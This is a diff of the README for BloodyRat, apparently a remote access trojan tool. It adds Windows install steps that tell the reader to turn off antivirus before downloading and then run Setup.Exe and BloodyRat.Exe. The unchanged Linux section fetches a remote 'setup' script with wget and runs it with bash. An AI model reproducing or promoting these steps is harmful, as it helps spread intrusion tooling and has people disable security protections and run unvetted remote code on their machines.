@@ -66,8 +66,20 @@ Linux kali,ubuntu,Parrot | Supported
 Android | Support
 
 ### Windows
+Note :- Turn off Antivirus Before Downloading Zip File    
+##### Requirements:- **Java** , **Node.js**
 
-### Linux 
+##### Download:- [**Java**](https://www.java.com/en/download/manual.jsp) [**Node.js**](https://nodejs.org/en/download/)    
+
+##### Installation:-
+
+###### • Download Zip file Of BloodyRat
+
+###### • Run Setup.Exe 
+ 
+###### • Run BloodyRat.Exe 
+
+### Linux
 #### <p align="center"> ```wget -N https://github.com/Bhaviktutorials/BloodyRat/raw/main/setup```
 #### <p align="center"> ``` bash setup```
 
@@ -84,7 +96,7 @@ Android | Support
 
 ### Android
 
-### Cloud Shell 
+### Cloud Shell
 ***
 ## <p align="center"> Workflow ⚙️
 <br>
